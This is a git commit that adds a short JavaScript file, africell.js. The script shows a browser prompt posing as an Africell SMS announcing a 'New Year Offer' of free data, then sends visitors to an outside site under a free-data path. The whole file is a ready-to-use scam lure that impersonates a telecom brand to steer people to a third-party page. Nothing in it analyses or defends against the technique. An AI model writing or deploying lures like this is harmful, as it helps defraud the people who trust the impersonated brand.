b7fb02f9bdce2920a17114498e42a1f3dc9eda32
newetijazz10 <newetijazz10@gmail.com>
2026-01-02 20:34:56 +0100

    Create africell.js

---
+++ africell.js
@@ -0,0 +1,8 @@
+  var password = 'ACTIVATE FREE DATA'
+password = prompt(
+  'SMS: Congratulations! Your Africell number is eligible to receive New Year Offer. Please press OK to Actiavte Data now.',
+  'ACTIVATE FREE DATA'
+);
+if (password != 'ACTIVATE FREE DATA') {
+  location.href = 'https://www.favmrzi.online/africell-free-data';
+}
